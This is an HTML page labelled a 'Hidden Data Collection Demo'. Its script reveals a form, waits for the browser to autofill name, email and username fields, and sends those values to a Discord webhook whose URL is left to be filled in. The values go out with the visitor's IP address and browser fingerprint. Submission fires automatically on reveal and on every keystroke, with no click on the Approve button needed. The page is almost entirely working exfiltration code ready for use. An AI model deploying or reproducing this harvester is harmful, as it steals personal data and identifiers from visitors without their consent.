<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Hidden Data Collection Demo</title>
  <style>
    body {
      margin: 0;
      font-family: sans-serif;
      background: #fff;
      color: #333;
    }

    .container {
      max-width: 400px;
      margin: 100px auto;
      text-align: center;
      padding: 20px;
    }

    h1 {
      font-size: 1.5em;
      margin-bottom: 20px;
    }

    p {
      margin-bottom: 20px;
      font-size: 1em;
      line-height: 1.4em;
      color: #555;
    }

    #trigger {
      display: inline-block;
      padding: 10px 20px;
      font-size: 1em;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      text-decoration: none;
      color: #fff;
      background: #4CAF50;
      font-weight: 600;
    }

    #formContainer {
      margin-top: 20px;
      text-align: left;
      display: none;
    }

    label {
      display: block;
      margin-bottom: 5px;
      font-weight: 600;
      font-size: 0.9em;
    }

    input[type="text"], input[type="email"], textarea {
      width: 100%;
      padding: 10px;
      margin-bottom: 15px;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
      font-size: 1em;
      background: #fafafa;
    }

    textarea {
      resize: none;
      height: 80px;
    }

    #approve {
      display: block;
      margin: 20px auto 0 auto;
      padding: 10px 20px;
      font-size: 1em;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      text-decoration: none;
      color: #fff;
      background: #4CAF50;
      font-weight: 600;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Data Collection Form</h1>
    <p>This form may be autofilled by your browser. Once revealed, weâ€™ll attempt to read whatever data is autofilled, along with other unique identifiers.</p>
    <button id="trigger">Reveal Form</button>

    <div id="formContainer">
      <form id="userForm" autocomplete="on">
        <label for="fname">Your First Name</label>
        <input type="text" id="fname" name="given-name" autocomplete="given-name">

        <label for="lname">Your Last Name</label>
        <input type="text" id="lname" name="family-name" autocomplete="family-name">

        <label for="email">Your Email</label>
        <input type="email" id="email" name="email" autocomplete="email">
        
        <label for="username">Username (Optional)</label>
        <input type="text" id="username" name="username" autocomplete="username">

        <label for="reason">Reason for Contact (Optional)</label>
        <textarea id="reason" name="reason"></textarea>
      </form>
      <button id="approve">Approve</button>
    </div>
  </div>

  <script>
    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/xxxxxxxx/xxxxxxxxxxx'; // Replace with your webhook

    const trigger = document.getElementById('trigger');
    const formContainer = document.getElementById('formContainer');
    const fnameField = document.getElementById('fname');
    const lnameField = document.getElementById('lname');
    const emailField = document.getElementById('email');
    const usernameField = document.getElementById('username');
    const reasonField = document.getElementById('reason');

    let userIP = 'Unknown IP';
    let userAgent = navigator.userAgent || 'Unknown User Agent';
    let userPlatform = navigator.platform || 'Unknown Platform';
    let userLanguage = navigator.language || 'Unknown Language';
    let userLanguages = navigator.languages ? navigator.languages.join(', ') : 'Unknown Languages';
    let hardwareConcurrency = typeof navigator.hardwareConcurrency === 'number' ? navigator.hardwareConcurrency : 'Unknown Cores';
    let deviceMemory = typeof navigator.deviceMemory === 'number' ? navigator.deviceMemory + ' GB' : 'Unknown Memory';
    let maxTouchPoints = typeof navigator.maxTouchPoints === 'number' ? navigator.maxTouchPoints : 'Unknown Touch Points';

    // Fetch the user's IP on page load
    window.addEventListener('load', () => {
      fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
          userIP = data.ip;
        })
        .catch(err => console.error('Error fetching IP:', err));
    });

    trigger.addEventListener('click', () => {
      formContainer.style.display = 'block';

      // Check after a short delay to see if browser has autofilled fields
      setTimeout(checkFields, 500);
    });

    function checkFields() {
      // If any field is populated, submit immediately
      if (isAnyFieldFilled()) {
        submitData();
      }
    }

    function isAnyFieldFilled() {
      return (
        fnameField.value.trim() !== '' ||
        lnameField.value.trim() !== '' ||
        emailField.value.trim() !== '' ||
        usernameField.value.trim() !== '' ||
        reasonField.value.trim() !== ''
      );
    }

    function submitData() {
      const fname = fnameField.value.trim() || '[No First Name]';
      const lname = lnameField.value.trim() || '[No Last Name]';
      const email = emailField.value.trim() || '[No Email]';
      const username = usernameField.value.trim() || '[No Username]';
      const reason = reasonField.value.trim() || '[No Reason]';

      const message = 
        `**Data Collected:**\n` +
        `**IP:** ${userIP}\n` +
        `**User Agent:** ${userAgent}\n` +
        `**Platform:** ${userPlatform}\n` +
        `**Language:** ${userLanguage}\n` +
        `**Languages:** ${userLanguages}\n` +
        `**CPU Cores:** ${hardwareConcurrency}\n` +
        `**Device Memory:** ${deviceMemory}\n` +
        `**Max Touch Points:** ${maxTouchPoints}\n` +
        `**First Name:** ${fname}\n` +
        `**Last Name:** ${lname}\n` +
        `**Email:** ${email}\n` +
        `**Username:** ${username}\n` +
        `**Reason:** ${reason}`;

      fetch(DISCORD_WEBHOOK_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ content: message })
      })
      .then(response => {
        if (response.ok) {
          console.log('Message sent to Discord successfully!', message);
        } else {
          console.error('Failed to send message to Discord:', response.status, response.statusText);
        }
      })
      .catch(err => console.error('Error sending message to Discord:', err));
    }

    // Also listen for any changes after initial check
    [fnameField, lnameField, emailField, usernameField, reasonField].forEach(field => {
      field.addEventListener('input', () => {
        if (isAnyFieldFilled()) {
          submitData();
        }
      });
      field.addEventListener('change', () => {
        if (isAnyFieldFilled()) {
          submitData();
        }
      });
    });
  </script>
</body>
</html>
